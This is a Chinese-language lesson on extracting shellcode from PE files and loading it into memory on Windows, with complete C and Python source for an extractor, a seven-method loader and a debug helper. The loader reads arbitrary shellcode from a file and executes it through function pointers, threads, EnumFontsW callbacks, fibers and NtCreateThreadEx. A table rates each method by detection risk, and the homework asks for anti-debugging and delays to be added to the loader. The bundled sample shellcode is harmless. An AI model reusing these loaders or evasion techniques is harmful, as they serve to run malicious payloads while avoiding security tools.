# 课时04 - ShellCode提取与加载

## 课程目标
1. 掌握从PE文件中提取ShellCode的方法
2. 理解ShellCode加载器的工作原理
3. 实现多种ShellCode执行方式
4. 掌握ShellCode调试技巧

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| Loader | 加载器 | 将ShellCode加载到内存并执行的程序 |
| RWX | Read-Write-Execute | 可读可写可执行的内存权限 |
| VirtualAlloc | - | 分配虚拟内存的Windows API |
| DEP | Data Execution Prevention | 数据执行保护，阻止数据页执行 |
| .text | Text Section | PE文件中存放代码的区段 |
| Entry Point | 入口点 | 程序执行的起始地址 |

## 使用工具

| 工具 | 用途 | 备注 |
|------|------|------|
| Visual Studio | 编译和提取 | 生成带ShellCode的PE |
| HxD | 十六进制编辑 | 提取原始字节 |
| objcopy | 提取区段 | GNU工具链 |
| Python | 自动化提取 | 编写提取脚本 |
| x64dbg | 调试验证 | 验证ShellCode功能 |

## 技术原理

### 1. ShellCode提取流程

```
┌─────────────────────────────────────────┐
│  1. 编写ShellCode函数                    │
│     - 使用__declspec(naked)             │
│     - 放入特定代码段                     │
├─────────────────────────────────────────┤
│  2. 编译生成PE文件                       │
│     - 禁用优化                          │
│     - 禁用安全检查                       │
├─────────────────────────────────────────┤
│  3. 定位代码段                          │
│     - 解析PE头                          │
│     - 找到目标区段                       │
├─────────────────────────────────────────┤
│  4. 提取原始字节                         │
│     - 计算起止位置                       │
│     - 导出为bin文件                      │
├─────────────────────────────────────────┤
│  5. 验证与测试                          │
│     - 加载到内存                         │
│     - 执行并验证功能                     │
└─────────────────────────────────────────┘
```

### 2. 内存分配与权限

```
PAGE_EXECUTE_READWRITE (0x40) - 可读写执行
PAGE_EXECUTE_READ (0x20)      - 可读执行
PAGE_READWRITE (0x04)         - 可读写

推荐方式：
1. VirtualAlloc(PAGE_READWRITE)   - 分配可写内存
2. 复制ShellCode到内存
3. VirtualProtect(PAGE_EXECUTE_READ) - 修改为可执行
```

### 3. 执行方式对比

| 方式 | 优点 | 缺点 | 检测风险 |
|------|------|------|----------|
| 函数指针 | 简单直接 | 容易被检测 | 高 |
| CreateThread | 异步执行 | 需等待完成 | 中 |
| 回调函数 | 隐蔽性好 | 复杂度高 | 低 |
| Fiber | 无需新线程 | 需初始化 | 低 |
| APC | 隐蔽 | 需等待 | 低 |

## 代码实现

### 1. ShellCode提取工具

```c
// shellcode_extractor.c
// ShellCode提取与导出工具

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// 从PE文件中提取指定区段
BOOL ExtractSection(const char* peFile, const char* sectionName, const char* outputFile) {
    HANDLE hFile = CreateFileA(peFile, GENERIC_READ, FILE_SHARE_READ, 
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open file: %s\n", peFile);
        return FALSE;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPBYTE fileData = (LPBYTE)malloc(fileSize);
    
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // 解析PE头
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)fileData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS header\n");
        free(fileData);
        return FALSE;
    }
    
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(fileData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid PE signature\n");
        free(fileData);
        return FALSE;
    }
    
    // 遍历区段
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)pSection[i].Name, sectionName, 8) == 0) {
            printf("[+] Found section: %s\n", sectionName);
            printf("    VirtualAddress:  0x%08X\n", pSection[i].VirtualAddress);
            printf("    VirtualSize:     0x%08X\n", pSection[i].Misc.VirtualSize);
            printf("    PointerToRawData: 0x%08X\n", pSection[i].PointerToRawData);
            printf("    SizeOfRawData:   0x%08X\n", pSection[i].SizeOfRawData);
            
            // 提取数据
            LPBYTE sectionData = fileData + pSection[i].PointerToRawData;
            DWORD sectionSize = pSection[i].SizeOfRawData;
            
            // 写入文件
            HANDLE hOut = CreateFileA(outputFile, GENERIC_WRITE, 0,
                                       NULL, CREATE_ALWAYS, 0, NULL);
            if (hOut != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(hOut, sectionData, sectionSize, &written, NULL);
                CloseHandle(hOut);
                printf("[+] Extracted %lu bytes to: %s\n", written, outputFile);
                free(fileData);
                return TRUE;
            }
        }
    }
    
    printf("[-] Section not found: %s\n", sectionName);
    free(fileData);
    return FALSE;
}

// 从函数地址提取ShellCode
void ExtractFromFunction(void* funcStart, void* funcEnd, const char* outputFile) {
    size_t size = (LPBYTE)funcEnd - (LPBYTE)funcStart;
    
    printf("[+] Function address: %p - %p\n", funcStart, funcEnd);
    printf("[+] Size: %zu bytes\n", size);
    
    // 输出C数组格式
    printf("\nunsigned char shellcode[] = \"");
    LPBYTE code = (LPBYTE)funcStart;
    for (size_t i = 0; i < size; i++) {
        printf("\\x%02X", code[i]);
        if ((i + 1) % 16 == 0 && i < size - 1) {
            printf("\"\n\"");
        }
    }
    printf("\";\n");
    
    // 写入二进制文件
    if (outputFile) {
        HANDLE hFile = CreateFileA(outputFile, GENERIC_WRITE, 0,
                                    NULL, CREATE_ALWAYS, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, funcStart, (DWORD)size, &written, NULL);
            CloseHandle(hFile);
            printf("\n[+] Written to: %s\n", outputFile);
        }
    }
}

// 使用标记提取ShellCode
#pragma section(".shell", execute, read)
__declspec(allocate(".shell")) unsigned char g_shellcodeStart = 0xCC;

// 示例ShellCode函数
#ifndef _WIN64
__declspec(naked) void __stdcall SampleShellcode() {
    __asm {
        // 这里放置ShellCode
        pushad
        xor eax, eax
        popad
        ret
    }
}
#endif

__declspec(allocate(".shell")) unsigned char g_shellcodeEnd = 0xCC;

// 自动提取带标记的ShellCode
void ExtractMarkedShellcode() {
    LPBYTE start = &g_shellcodeStart + 1;
    LPBYTE end = &g_shellcodeEnd;
    size_t size = end - start;
    
    printf("[+] Shellcode from markers:\n");
    printf("    Start: %p\n", start);
    printf("    End:   %p\n", end);
    printf("    Size:  %zu bytes\n\n", size);
    
    printf("unsigned char shellcode[] = \"");
    for (size_t i = 0; i < size; i++) {
        printf("\\x%02X", start[i]);
        if ((i + 1) % 16 == 0 && i < size - 1) {
            printf("\"\n\"");
        }
    }
    printf("\";\n");
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("     ShellCode Extraction Tool          \n");
    printf("========================================\n\n");
    
    if (argc >= 4) {
        // 命令行模式：从PE提取区段
        ExtractSection(argv[1], argv[2], argv[3]);
    } else {
        // 演示模式
        printf("[*] Usage: %s <pe_file> <section_name> <output_file>\n", argv[0]);
        printf("[*] Example: %s test.exe .shell shellcode.bin\n\n", argv[0]);
        
        // 提取标记的ShellCode
        ExtractMarkedShellcode();
    }
    
    return 0;
}
```

### 2. 多种ShellCode加载方式

```c
// shellcode_loader.c
// 多种ShellCode加载执行方式

#include <windows.h>
#include <stdio.h>

// 示例ShellCode (MessageBox)
unsigned char shellcode[] = 
    "\x90\x90\x90\x90"  // NOP sled
    "\xCC"              // int3 (调试断点)
    "\xC3";             // ret

// 方式1: 函数指针直接调用
typedef void (*SHELLCODE_FUNC)();

void Method1_FunctionPointer(unsigned char* code, size_t size) {
    printf("[*] Method 1: Function Pointer\n");
    
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, 
                              PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[-] VirtualAlloc failed\n");
        return;
    }
    
    memcpy(mem, code, size);
    printf("[+] ShellCode at: %p\n", mem);
    
    SHELLCODE_FUNC func = (SHELLCODE_FUNC)mem;
    func();
    
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[+] Method 1 completed\n");
}

// 方式2: CreateThread
DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    SHELLCODE_FUNC func = (SHELLCODE_FUNC)lpParameter;
    func();
    return 0;
}

void Method2_CreateThread(unsigned char* code, size_t size) {
    printf("[*] Method 2: CreateThread\n");
    
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    
    memcpy(mem, code, size);
    
    HANDLE hThread = CreateThread(NULL, 0, ThreadProc, mem, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[+] Method 2 completed\n");
}

// 方式3: 使用回调函数 (EnumFontsW)
void Method3_Callback(unsigned char* code, size_t size) {
    printf("[*] Method 3: EnumFontsW Callback\n");
    
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    
    memcpy(mem, code, size);
    
    // 使用EnumFontsW调用ShellCode
    HDC hdc = GetDC(NULL);
    EnumFontsW(hdc, NULL, (FONTENUMPROCW)mem, 0);
    ReleaseDC(NULL, hdc);
    
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[+] Method 3 completed\n");
}

// 方式4: Fiber
void Method4_Fiber(unsigned char* code, size_t size) {
    printf("[*] Method 4: Fiber\n");
    
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    
    memcpy(mem, code, size);
    
    // 转换当前线程为Fiber
    LPVOID mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    // 创建ShellCode Fiber
    LPVOID shellFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)mem, NULL);
    if (shellFiber) {
        SwitchToFiber(shellFiber);
        DeleteFiber(shellFiber);
    }
    
    ConvertFiberToThread();
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[+] Method 4 completed\n");
}

// 方式5: NtCreateThreadEx (更隐蔽)
typedef NTSTATUS (NTAPI* PFN_NTCREATETHREADEX)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

void Method5_NtCreateThreadEx(unsigned char* code, size_t size) {
    printf("[*] Method 5: NtCreateThreadEx\n");
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PFN_NTCREATETHREADEX pNtCreateThreadEx = 
        (PFN_NTCREATETHREADEX)GetProcAddress(hNtdll, "NtCreateThreadEx");
    
    if (!pNtCreateThreadEx) {
        printf("[-] NtCreateThreadEx not found\n");
        return;
    }
    
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    
    memcpy(mem, code, size);
    
    HANDLE hThread = NULL;
    NTSTATUS status = pNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        mem,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[+] Method 5 completed (status: 0x%08X)\n", status);
}

// 方式6: 两步内存分配（更安全）
void Method6_TwoStepAlloc(unsigned char* code, size_t size) {
    printf("[*] Method 6: Two-Step Allocation (RW -> RX)\n");
    
    // 第一步：分配可读写内存
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return;
    
    printf("[+] Allocated RW memory at: %p\n", mem);
    
    // 复制ShellCode
    memcpy(mem, code, size);
    
    // 第二步：修改为可执行
    DWORD oldProtect;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);
    printf("[+] Changed to RX protection\n");
    
    // 执行
    ((SHELLCODE_FUNC)mem)();
    
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[+] Method 6 completed\n");
}

// 方式7: 使用HeapAlloc + VirtualProtect
void Method7_HeapExec(unsigned char* code, size_t size) {
    printf("[*] Method 7: Heap + VirtualProtect\n");
    
    HANDLE hHeap = GetProcessHeap();
    LPVOID mem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
    if (!mem) return;
    
    memcpy(mem, code, size);
    
    DWORD oldProtect;
    VirtualProtect(mem, size, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    ((SHELLCODE_FUNC)mem)();
    
    VirtualProtect(mem, size, oldProtect, &oldProtect);
    HeapFree(hHeap, 0, mem);
    printf("[+] Method 7 completed\n");
}

// 从文件加载ShellCode
BOOL LoadShellcodeFromFile(const char* filename, unsigned char** ppCode, size_t* pSize) {
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open: %s\n", filename);
        return FALSE;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    unsigned char* code = (unsigned char*)malloc(fileSize);
    
    DWORD bytesRead;
    ReadFile(hFile, code, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    *ppCode = code;
    *pSize = fileSize;
    
    printf("[+] Loaded %lu bytes from: %s\n", fileSize, filename);
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("     ShellCode Loader Methods           \n");
    printf("========================================\n\n");
    
    unsigned char* code = shellcode;
    size_t codeSize = sizeof(shellcode) - 1;
    
    // 从文件加载
    if (argc >= 2) {
        if (!LoadShellcodeFromFile(argv[1], &code, &codeSize)) {
            return 1;
        }
    }
    
    printf("[*] ShellCode size: %zu bytes\n\n", codeSize);
    
    // 选择方法
    int method = 1;
    if (argc >= 3) {
        method = atoi(argv[2]);
    }
    
    switch (method) {
        case 1: Method1_FunctionPointer(code, codeSize); break;
        case 2: Method2_CreateThread(code, codeSize); break;
        case 3: Method3_Callback(code, codeSize); break;
        case 4: Method4_Fiber(code, codeSize); break;
        case 5: Method5_NtCreateThreadEx(code, codeSize); break;
        case 6: Method6_TwoStepAlloc(code, codeSize); break;
        case 7: Method7_HeapExec(code, codeSize); break;
        default:
            printf("[*] Available methods: 1-7\n");
            printf("    1: Function Pointer\n");
            printf("    2: CreateThread\n");
            printf("    3: Callback (EnumFonts)\n");
            printf("    4: Fiber\n");
            printf("    5: NtCreateThreadEx\n");
            printf("    6: Two-Step Alloc\n");
            printf("    7: Heap Exec\n");
    }
    
    if (code != shellcode) {
        free(code);
    }
    
    return 0;
}
```

### 3. Python提取脚本

```python
#!/usr/bin/env python3
# extract_shellcode.py
# 从PE文件中提取ShellCode

import sys
import struct
import os

def read_pe_section(pe_path, section_name):
    """从PE文件中读取指定区段"""
    with open(pe_path, 'rb') as f:
        data = f.read()
    
    # DOS头
    if data[:2] != b'MZ':
        print("[-] Invalid DOS header")
        return None
    
    e_lfanew = struct.unpack('<I', data[0x3C:0x40])[0]
    
    # PE签名
    if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
        print("[-] Invalid PE signature")
        return None
    
    # COFF头
    machine = struct.unpack('<H', data[e_lfanew+4:e_lfanew+6])[0]
    num_sections = struct.unpack('<H', data[e_lfanew+6:e_lfanew+8])[0]
    
    # Optional头大小
    opt_header_size = struct.unpack('<H', data[e_lfanew+20:e_lfanew+22])[0]
    
    # 区段表起始位置
    section_table = e_lfanew + 24 + opt_header_size
    
    print(f"[*] PE File: {pe_path}")
    print(f"[*] Sections: {num_sections}")
    
    # 遍历区段
    for i in range(num_sections):
        offset = section_table + i * 40
        name = data[offset:offset+8].rstrip(b'\x00').decode('ascii', errors='ignore')
        virtual_size = struct.unpack('<I', data[offset+8:offset+12])[0]
        virtual_addr = struct.unpack('<I', data[offset+12:offset+16])[0]
        raw_size = struct.unpack('<I', data[offset+16:offset+20])[0]
        raw_offset = struct.unpack('<I', data[offset+20:offset+24])[0]
        
        print(f"    [{i}] {name:8s} VA=0x{virtual_addr:08X} Size=0x{raw_size:08X}")
        
        if name == section_name:
            print(f"\n[+] Found target section: {section_name}")
            return data[raw_offset:raw_offset+raw_size]
    
    print(f"[-] Section not found: {section_name}")
    return None

def format_shellcode(data, format_type='c'):
    """格式化ShellCode输出"""
    if format_type == 'c':
        result = 'unsigned char shellcode[] = \n"'
        for i, b in enumerate(data):
            result += f'\\x{b:02X}'
            if (i + 1) % 16 == 0 and i < len(data) - 1:
                result += '"\n"'
        result += '";\n'
        return result
    elif format_type == 'python':
        result = 'shellcode = b"'
        for i, b in enumerate(data):
            result += f'\\x{b:02X}'
            if (i + 1) % 16 == 0 and i < len(data) - 1:
                result += '"\\\n"'
        result += '"\n'
        return result
    elif format_type == 'hex':
        return data.hex()
    else:
        return data

def remove_trailing_zeros(data):
    """移除尾部的零字节"""
    while data and data[-1] == 0:
        data = data[:-1]
    return data

def main():
    if len(sys.argv) < 3:
        print("Usage: python extract_shellcode.py <pe_file> <section_name> [output_file] [format]")
        print("Formats: c, python, hex, bin")
        sys.exit(1)
    
    pe_file = sys.argv[1]
    section_name = sys.argv[2]
    output_file = sys.argv[3] if len(sys.argv) > 3 else None
    format_type = sys.argv[4] if len(sys.argv) > 4 else 'c'
    
    # 提取区段
    section_data = read_pe_section(pe_file, section_name)
    if section_data is None:
        sys.exit(1)
    
    # 移除尾部零
    section_data = remove_trailing_zeros(section_data)
    
    print(f"[+] Extracted {len(section_data)} bytes")
    
    # 输出
    if output_file:
        if format_type == 'bin':
            with open(output_file, 'wb') as f:
                f.write(section_data)
        else:
            with open(output_file, 'w') as f:
                f.write(format_shellcode(section_data, format_type))
        print(f"[+] Saved to: {output_file}")
    else:
        print(format_shellcode(section_data, format_type))

if __name__ == "__main__":
    main()
```

### 4. ShellCode调试辅助

```c
// shellcode_debug.c
// ShellCode调试辅助工具

#include <windows.h>
#include <stdio.h>

// 在ShellCode前添加调试断点
unsigned char* PrepareForDebug(unsigned char* code, size_t size, size_t* newSize) {
    // 添加INT3断点
    *newSize = size + 1;
    unsigned char* newCode = (unsigned char*)malloc(*newSize);
    newCode[0] = 0xCC;  // INT3
    memcpy(newCode + 1, code, size);
    return newCode;
}

// 打印ShellCode反汇编提示
void PrintDisassemblyHint(unsigned char* code, size_t size) {
    printf("\n=== Disassembly Hints ===\n");
    printf("Common x86 instructions:\n");
    printf("  90     - NOP\n");
    printf("  CC     - INT3 (breakpoint)\n");
    printf("  C3     - RET\n");
    printf("  C2 xx  - RET imm16\n");
    printf("  E8 xx  - CALL rel32\n");
    printf("  E9 xx  - JMP rel32\n");
    printf("  EB xx  - JMP rel8\n");
    printf("  FF D0  - CALL EAX\n");
    printf("  FF E0  - JMP EAX\n");
    printf("  31 C0  - XOR EAX, EAX\n");
    printf("  50-57  - PUSH EAX-EDI\n");
    printf("  58-5F  - POP EAX-EDI\n");
    
    // 检查关键位置
    printf("\n=== Quick Analysis ===\n");
    
    // 检查是否以pushad开始
    if (size > 0 && code[0] == 0x60) {
        printf("[+] Starts with PUSHAD\n");
    }
    
    // 检查是否以ret结束
    if (size > 0) {
        if (code[size-1] == 0xC3) {
            printf("[+] Ends with RET\n");
        } else if (code[size-1] == 0xC2 && size > 2) {
            printf("[+] Ends with RET imm16\n");
        }
    }
    
    // 统计空字节
    int nullCount = 0;
    for (size_t i = 0; i < size; i++) {
        if (code[i] == 0x00) nullCount++;
    }
    printf("[*] Null bytes: %d (%.1f%%)\n", nullCount, (float)nullCount/size*100);
    
    // 检查字符串
    printf("\n=== Embedded Strings ===\n");
    for (size_t i = 0; i < size - 4; i++) {
        // 检查是否可能是字符串
        if (code[i] >= 0x20 && code[i] < 0x7F) {
            int len = 0;
            while (i + len < size && code[i+len] >= 0x20 && code[i+len] < 0x7F) {
                len++;
            }
            if (len >= 4) {
                printf("  [0x%04zX] \"", i);
                for (int j = 0; j < len && j < 32; j++) {
                    printf("%c", code[i+j]);
                }
                if (len > 32) printf("...");
                printf("\"\n");
                i += len;
            }
        }
    }
}

// 创建调试用的可执行文件
void CreateDebugExe(unsigned char* code, size_t size, const char* filename) {
    printf("\n[*] To debug, use x64dbg:\n");
    printf("    1. Open the loader executable\n");
    printf("    2. Set breakpoint at VirtualAlloc\n");
    printf("    3. Step to the call instruction\n");
    printf("    4. Follow in dump the allocated memory\n");
    printf("    5. Right-click -> Follow in Disassembler\n");
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("     ShellCode Debug Helper             \n");
    printf("========================================\n\n");
    
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }
    
    // 读取ShellCode
    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open: %s\n", argv[1]);
        return 1;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    unsigned char* code = (unsigned char*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, code, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    printf("[+] Loaded %lu bytes from: %s\n", bytesRead, argv[1]);
    
    // 分析
    PrintDisassemblyHint(code, bytesRead);
    
    // 调试提示
    CreateDebugExe(code, bytesRead, "debug.exe");
    
    free(code);
    return 0;
}
```

## 课后作业

### 作业1：实现自动提取
编写程序，自动从编译后的PE文件中提取.shell区段。

### 作业2：多格式导出
扩展提取工具，支持导出为C、Python、C#、PowerShell等格式。

### 作业3：加载器混淆
为ShellCode加载器添加简单的时间延迟和反调试检测。
